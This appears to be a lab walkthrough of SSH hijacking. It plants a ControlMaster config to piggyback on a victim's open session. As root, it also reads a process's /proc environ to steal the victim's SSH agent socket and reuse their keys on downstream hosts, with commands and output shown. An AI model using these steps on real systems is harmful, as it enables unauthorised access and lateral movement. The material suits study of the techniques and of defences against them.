:) use keys lol

# SSH Hijacking with ControlMaster

ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file (~/.ssh/config).

This file can be created or modified by users with elevated privileges or write access to the user’s home folder. By doing so, a malicious actor can create an attack vector when there wasn’t one originally, by enabling ControlMaster functionality for an unwitting user.

create the `~/.ssh/config` file,
```
Host *
ControlPath ~/.ssh/controlmaster/%r@%h:%p
ControlMaster auto
ControlPersist 10m
```

The ControlPath entry in our example specifies that the ControlMaster socket file should be placed in ~/.ssh/controlmaster/ with the name `<remoteusername@<targethost>:<port>`. This assumes that the specified controlmaster folder actually exists.

The ControlMaster line identifies that any new connections will attempt to use existing ControlMaster sockets when possible. When those are unavailable, it will start a new connection.

ControlPersist can either be set to “yes” or to a specified time. If it is set to “yes”, the socket stays open indefinitely. Alternatively, it will accept new connections for a specified amount of time after the last connection has terminated. In the above configuration, the socket will remain open for 10 minutes after the last connection and then it will close.

Next, to simulate our victim connecting to a downstream server, we’ll SSH to the controller VM as the legitimate offsec user. We’ll then SSH from the controller VM to the linuxvictim VM in the same session.

Once the connection is established, we’ll move back to the offsec attacker session. We should be able to find a socket file in ~/.ssh/controlmaster/ on the controller VM called offsec@linuxvictim:22.
```bash
offsec@controller:~$ ls -al ~/.ssh/controlmaster/
total 8
drwxrwxr-x 2 offsec offsec 4096 May 13 13:55 .
drwx------ 3 offsec offsec 4096 May 13 13:55 ..
srw------- 1 offsec offsec 0 May 13 13:55 offsec@linuxvictim:22
```

We can now use this open socket as an attacker to piggyback off of it into linuxvictim without a password:
```bash
offsec@controller:~$ ssh offsec@linuxvictim
Last login: Wed May 13 16:11:26 2020 from 192.168.120.40
offsec@linuxvictim:~$
```

# SSH Hijacking using SSH-Agent and SSH-Agent Forwarding

SSH-Agent is a utility that keeps track of a user’s private keys and allows them to be used without having to repeat their passphrases on every connection.

SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine. This is useful in situations where a user might need to ssh from an intermediate host into another network segment, which can’t be directly accessed from the originating machine. It has the advantage of not requiring the private key to be stored on the intermediate server and the user does not need to enter their passphrase more than once.

# Setup

To use an SSH-Agent, there needs to be an SSH keypair set up on the originating machine. This can be done with ssh-keygen as we covered earlier, ensuring we set a passphrase.

For our SSH connections to work using SSH-Agent forwarding, we need to have our public key installed on both the intermediate server and the destination server. In our case, the intermediate server will be the controller machine and the destination server will be linuxvictim. We can copy our key to both of them using the ssh-copy-id command from our Kali VM, specifying our public key with the -i flag.
```bash
kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
```

Additionally, we need to set our local SSH config file in ~/.ssh/config on our Kali VM to have the following line.
```
ForwardAgent yes
```

Next, on the intermediate server, which in our case is the controller, we need to have the following line set in /etc/ssh/sshd_config.
```
AllowAgentForwarding yes
```

We can now add our keys to the SSH-Agent on our Kali VM using ssh-add. If we just want to use the key that is in the default key location (~/.ssh/id_rsa), we don’t need to specify any parameters. Alternatively, we can add the path to the key file we want to use immediately after the command. In our case, since our key is in the default location, we can just run ssh-add.
```
kali@kali:~$ ssh-add
Enter passphrase for /home/kali/.ssh/id_rsa:
Identity added: /home/kali/.ssh/id_rsa (kali@kali)
```

Now just use SSH to hop from server to server:
```
kali@kali:~$ ssh offsec@controller
Enter passphrase for key '/home/kali/.ssh/id_rsa':

offsec@controller:~$ ssh offsec@linuxvictim
offsec@linuxvictim:~$
```

Only enter the passphrase for the intermediate server so that SSH-Agent keeps track of it

With our previous ControlMaster exploitation, we were restricted to connecting to downstream servers that the user had an existing open connection to. With SSH agent forwarding, we don’t have this restriction. Since the intermediate system acts as if we already have the user’s SSH keys available, we can SSH to any downstream server the compromised user’s private key has access to.

To exploit this, the compromised user needs to have an active SSH connection to the intermediate server. We’ll simulate this by closing the previous shell to the linuxvictim box opened from the controller machine, but we’ll leave the connection to the intermediate server open. This will act as the victim SSH offsec user session. Next, to simulate the attacker connection, we’ll open a shell to the intermediate server using password authentication as the offsec user, and from there, we will ssh to the linuxvictim machine.

If we are root, we can steal the open active socket:
```
root@controller:~# cat /proc/16381/environ
LANG=en_US.UTF-
8USER=offsecLOGNAME=offsecHOME=/home/offsecPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesMAIL=/var/mail/offsecSHELL=/bin/bash
SSH_CLIENT=192.168.119.120 49916 22SSH_CONNECTION=192.168.119.120 49916 192.168.120.40
22SSH_TTY=/dev/pts/1TERM=xterm-
256colorXDG_SESSION_ID=29XDG_RUNTIME_DIR=/run/user/1000SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
root@controller:~#
```

Once locating it, we place it as an environment variable:
```
root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
3072 SHA256:6cyHlr9fISx9kcgR9+1crO1Hnc+nVw0mnmQ/Em5KSfo kali@kali (RSA)
root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh
offsec@linuxvictim
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...
Last login: Thu Jul 30 11:14:26 2020 from 192.168.120.40
offsec@linuxvictim:~$
```

